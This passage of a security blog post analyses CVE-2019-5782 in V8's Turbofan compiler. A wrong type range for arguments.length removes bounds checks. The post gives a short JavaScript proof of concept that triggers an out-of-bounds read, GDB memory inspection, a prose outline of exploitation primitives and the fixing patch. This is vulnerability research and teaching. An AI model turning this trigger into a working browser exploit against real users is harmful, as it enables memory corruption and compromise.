</span></span></code></pre></div><p><code>VisitCheckBounds()</code> is a function responsible for optimizing the <code>CheckBounds</code> node in the <strong>SimplifiedLowering</strong> phase, i.e. the node that performs bounds checking of the array to ensure that out-of-bounds (<strong>OOB</strong>) do not occur. <code>index_type</code> is the type (range) of the index trying to access the array, and <code>length_type</code> is the type (range) of the length of the array.</p>
<p>If <code>index_type.Min() &gt;= 0.0 &amp;&amp; index_type.Max() &lt; length_type.Min()</code> is satisfied, <code>DeferReplacement()</code> is called inside the conditional statement to remove the CheckBounds node. <code>Index_type.Max()</code> being less than <code>length_type.Min()</code> means there is absolutely no chance of OOB occurring. For example, if the index range of array <code>arr</code> is <code>[0, 5]</code> and the length range is <code>[10, 15]</code>, then no matter where you access <code>arr[0]</code> to <code>arr[5]</code>, the size of <code>arr</code> is at least 10, so it is absolutely OOB does not occur. In these cases, we determine that there is no need to perform bounds checking.</p>
<p>When there is a code like <code>arr[(arguments.length &gt;&gt; 16) * idx]</code>, from Turbofan&rsquo;s perspective, the range of <code>arguments.length &gt;&gt; 16</code> is [0, 0], so regardless of the value of <code>idx</code>, the range of the index is It is <code>[0, 0]</code>. If the length of arr is greater than 1, that is, unless it is an empty array, the CheckBounds node is removed and no bounds checking is performed.</p>
<p>Even if 0x10000 arguments are passed to the function and the actual value of <code>arguments.length &gt;&gt; 16</code> is 1, the CheckBounds node is still removed because it can never be 0 from Turbofan&rsquo;s point of view. Then, OOB can be generated in <code>arr[(arguments.length &gt;&gt; 16) * idx]</code>, and by adjusting the value of <code>idx</code>, you can access an arbitrary index and read or write the value.</p>
<p><img src="Untitled.jpeg" alt="Untitled"></p>
<p>The right side of the code is vulnerable code which goes through the optimization phase, the left side is unoptimized code, we came to reach vulnerability by the right side of the code, what is the meaning of the pseudo float number on the right?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">NOTE</span>: <span style="color:#bd93f9">0xdeadbeef</span> represented as an example the hexadecimal data in the stack alignment.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Unoptimized code can not access to ARRAY[<span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>ARRAY[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.1</span>
</span></span><span style="display:flex;"><span>_______________________________________________________
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0.1</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span> ....
</span></span><span style="display:flex;"><span>ARRAY[<span style="color:#bd93f9">1</span>] gives undefined
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">##########################################################################
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>Optimized code can access to ARRAY[<span style="color:#bd93f9">1</span>], because of wrong assumptions in 
</span></span><span style="display:flex;"><span>optimization process
</span></span><span style="display:flex;"><span>ARRAY[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.1</span>
</span></span><span style="display:flex;"><span>_______________________________________________________
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0.1</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">0xdeadbeef</span> <span style="color:#ff79c6">|</span> ....
</span></span><span style="display:flex;"><span>ARRAY[<span style="color:#bd93f9">1</span>] gives <span style="color:#bd93f9">1.8457939563e-314</span> <span style="color:#8be9fd">double</span> represention of <span style="color:#bd93f9">0xdeadbeef</span>
</span></span></code></pre></div><p>Letâ€™s prove of theory by debugging with GDB, and PoC code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> a;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> f() {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> l <span style="color:#ff79c6">=</span> arguments.length;
</span></span><span style="display:flex;"><span>    a <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">0.1</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> idx <span style="color:#ff79c6">=</span> (l <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a[idx];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>f();
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// To optimize the code
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">90000</span>; i<span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>  f();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> b <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Array</span>(<span style="color:#bd93f9">0x10000</span>);
</span></span><span style="display:flex;"><span>console.log(f(...b));
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>DebugPrint(a);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>SystemBreak();
</span></span></code></pre></div><p>We run the program into gdb with the flag <code>--allow-natives-syntax</code> is a command-line flag used in debugging to enable certain internal debugging commands and features related to V8&rsquo;s native code. All processes below are done through the optimization phase.</p>
<p><img src="Untitled.png" alt="Untitled"></p>
<p>The program prints out <code>2.7063596027204e-310</code>  double number which is the data next to <code>0.1</code>  array in the stack. As you can see in the elements of the array there is only one element <code>0.1</code>. Letâ€™s look at the stack address, what is the <code>2.7063596027204e-310</code>  double number inside of elements.</p>
<p><img src="Untitled%201.png" alt="Untitled"></p>
<p>Note: A subtraction of one is applied to the address for <a href="https://v8.dev/blog/pointer-compression">pointer tagging</a>.</p>
<p>The first <code>0x3fb999999999999a</code> hexadecimal represents <code>0.1</code> number by  Floating-Point Arithmetic IEEE 754 **standard, it is the same value as in array <code>a[0]</code>. The second <code>0x000031d1d7302ed9</code> hexadecimal represents the <code>2.7063596027204e-310</code> number which is the same printed out number of array <code>a[1]</code>, which means successfully accessed out-of-bounds of array.</p>
<p>Actually, the address <code>0x000031d1d7302ed9</code> is the address of the map of the <code>FixedDoubleArray</code>.</p>
<p><img src="Untitled%202.png" alt="Untitled"></p>
<h1 id="exploitation">Exploitation</h1>
<p>First, initializing one array to trigger the bug next to the second array to change its array length by OOB to achieve read of stack address, and by <code>addrof</code> and <code>fakeobj</code> primitive gaining read/write access the gaining to arbitrary read/write.</p>
<h1 id="patch">Patch</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>diffÂ <span style="color:#ff79c6">--</span>gitÂ a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.hÂ b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>indexÂ <span style="color:#bd93f9">251</span>ea08.<span style="color:#bd93f9">.9</span>be7261Â <span style="color:#bd93f9">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">---</span>Â a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+++</span>Â b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>@@Â <span style="color:#ff79c6">-</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">8</span>Â <span style="color:#ff79c6">+</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">7</span>Â @@
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Type<span style="color:#ff79c6">::</span>Union(Type<span style="color:#ff79c6">::</span>SignedSmall(),Â Type<span style="color:#ff79c6">::</span>NaN(),Â zone());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â Â <span style="color:#6272a4">//Â TheÂ validÂ numberÂ ofÂ argumentsÂ forÂ JavaScriptÂ functions.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">-</span>Â Â TypeÂ <span style="color:#ff79c6">const</span>Â kArgumentsLengthTypeÂ <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>Â Â Â Â Â Â Type<span style="color:#ff79c6">::</span>Range(<span style="color:#bd93f9">0.0</span>,Â Code<span style="color:#ff79c6">::</span>kMaxArguments,Â zone());
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span>Â Â TypeÂ <span style="color:#ff79c6">const</span>Â kArgumentsLengthTypeÂ <span style="color:#ff79c6">=</span>Â Type<span style="color:#ff79c6">::</span>Unsigned30();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â Â <span style="color:#6272a4">//Â TheÂ JSArrayIterator::kindÂ propertyÂ alwaysÂ containsÂ anÂ integerÂ inÂ the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Â Â Â <span style="color:#6272a4">//Â rangeÂ [0,Â 2],Â representingÂ theÂ possibleÂ IterationKinds.
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>diffÂ <span style="color:#ff79c6">--</span>gitÂ a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.hÂ b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>indexÂ <span style="color:#bd93f9">251</span>ea08.<span style="color:#bd93f9">.9</span>be7261Â <span style="color:#bd93f9">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">---</span>Â a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+++</span>Â b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>@@Â <span style="color:#ff79c6">-</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">8</span>Â <span style="color:#ff79c6">+</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">7</span>Â @@
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Type<span style="color:#ff79c6">::</span>Union(Type<span style="color:#ff79c6">::</span>SignedSmall(),Â Type<span style="color:#ff79c6">::</span>NaN(),Â zone());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â Â <span style="color:#6272a4">//Â TheÂ validÂ numberÂ ofÂ argumentsÂ forÂ JavaScriptÂ functions.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">-</span>Â Â TypeÂ <span style="color:#ff79c6">const</span>Â kArgumentsLengthTypeÂ <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>Â Â Â Â Â Â Type<span style="color:#ff79c6">::</span>Range(<span style="color:#bd93f9">0.0</span>,Â Code<span style="color:#ff79c6">::</span>kMaxArguments,Â zone());
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span>Â Â TypeÂ <span style="color:#ff79c6">const</span>Â kArgumentsLengthTypeÂ <span style="color:#ff79c6">=</span>Â Type<span style="color:#ff79c6">::</span>Unsigned30();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â Â <span style="color:#6272a4">//Â TheÂ JSArrayIterator::kindÂ propertyÂ alwaysÂ containsÂ anÂ integerÂ inÂ the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Â Â Â <span style="color:#6272a4">//Â rangeÂ [0,Â 2],Â representingÂ theÂ possibleÂ IterationKinds.
</span></span></span></code></pre></div><p><code>Type::Unsigned30()</code>Â is aÂ <strong>type</strong>Â in theÂ <strong>V8 engine</strong>.Â It is used to represent anÂ <strong>unsigned 30-bit integer</strong> used to declare an integer type that can only hold non-negative values. Therefore, the range of an unsigned 30-bit integer is from 0 to 1,073,741,823. It gives much more freedom to assumption, than max <code>kMaxArgumentsLength</code>.</p>
<h1 id="reference">Reference</h1>
<p>[1] <a href="https://v8.dev/blog/code-caching">https://v8.dev/blog/code-caching</a></p>
<p>[2] <a href="https://v8.dev/blog/optimizing-v8-memory">https://v8.dev/blog/optimizing-v8-memory</a></p>
<p>[3] <a href="https://v8.dev/blog/pointer-compression">https://v8.dev/blog/pointer-compression</a></p>
<p><a href="https://www.notion.so/V8-Chrome-5c0f121e2f2c455fa140d2237b497311?pvs=21">ĞĞµĞ¿Ñ€Ğ°Ğ²Ğ¸Ğ»ÑŒĞ½Ğ°Ñ Ğ¾Ğ¿Ñ‚Ğ¸Ğ¼Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ Ğ½Ğ° Ğ´Ğ²Ğ¸Ğ¶ĞºĞµ V8 Chrome</a></p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/cve-2019-5782">CVE-2019-5782</a></li>
					
					<li><a href="/tags/oob">OOB</a></li>
					
					<li><a href="/tags/v8">V8</a></li>
					
					<li><a href="/tags/javascript">Javascript</a></li>
					
					<li><a href="/tags/turbofan">Turbofan</a></li>
					
					<li><a href="/tags/compiler">Compiler</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2025  Â© Ravshan | Made with Love â¤ï¸ <a href="https://twitter.com/arzedlab/"> My Twitter ğŸª½</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
